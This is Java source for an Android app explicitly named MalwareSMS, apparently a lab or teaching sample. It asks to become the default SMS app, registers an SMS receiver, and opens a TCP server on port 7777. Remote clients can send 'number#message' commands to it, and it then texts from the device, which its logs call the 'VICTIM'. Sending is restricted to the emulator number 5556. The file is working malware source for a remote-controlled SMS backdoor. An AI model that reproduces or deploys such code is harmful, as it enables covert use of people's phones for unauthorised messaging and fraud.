package android.malwaresms;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;

public class MalwareSMS extends Activity {
    private ServerSocket serverSocket;
    public static final int SERVERPORT = 7777;
    Thread serverThread = null;
	public static ContentResolver cr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
	    super.onCreate(savedInstanceState);
	    
	    Log.e("onCreate", "Line 1");
        final String myPackageName = getPackageName();  
        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {  
        	Log.e("onCreate", "Line 2");
            Intent intent =  
                    new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);  
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,   
                    myPackageName);  
            startActivity(intent);  
        }
        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {  
        	Log.e("onCreate", "FAILED TO SET DEFAULT");
        }
        Log.e("onCreate", "Line 3");
	    
        cr = getContentResolver();
        
        setContentView(R.layout.activity_malware_sms);
        this.serverThread = new Thread(new ServerThread());
        this.serverThread.start();
        
        IntentFilter filter = new IntentFilter("android.provider.Telphony.SMS_RECEIVED");
        SMSReceiver receiver = new SMSReceiver();
        registerReceiver(receiver,filter);
    }
    
    class ServerThread implements Runnable {
    	public void run() {
    	   	startServer();
    	}
    }    
    
    public void sendSMS(String phoneNumber,String message){
		Log.i("sendSMS","before send SMS");
		//get a SmsManager
        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
        
        //Message may exceed 160 characters
        //need to divide the message into multiples
        ArrayList<String> divideContents = smsManager.divideMessage(message);
        
        for (String text : divideContents) {    
            smsManager.sendTextMessage(phoneNumber, null, text, null, null);    
        }  
    }
    
    public void startServer() {
    
	    Log.i("AndroidServer", "START..");
	    try{
		    //serverSocket = new ServerSocket(PORT);
		    //mSocket=new Socket(SERVER,PORT);
	    	serverSocket = new ServerSocket(SERVERPORT);
	
	    	while (true) {
		        Socket client = serverSocket.accept();
		        Log.i("VICTIM", "visting..");
		        try {
		        	client.getOutputStream().write(("Connected to the server! \n").getBytes("UTF-8"));
		            BufferedReader in = new BufferedReader(
		                    new InputStreamReader(client.getInputStream()));
		            String str = in.readLine();
		            String[] tempMessage = str.split("#");
					 Log.i("REC",tempMessage[0]);
					 
					 boolean flag = true;
					 if (tempMessage.length != 2) flag = false;
					 else if (!(tempMessage[0].equals("5556"))) flag = false;
					 
					 if (flag){
						 String phoneNo = tempMessage[0];
						 String message = tempMessage[1];
						 Log.i("AndroidServer", "No:" + phoneNo + " message:" + message);

						 sendSMS(phoneNo, message);
						 Log.i("REC","sent");
					 }
		            
		        } catch (Exception e) {
		            e.printStackTrace();
		        } finally {
		            client.close();
		        }
		        
		        try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
		    }
	    	
	    }
	    catch (IOException e) {
	   		e.printStackTrace();
	   	}
    }

}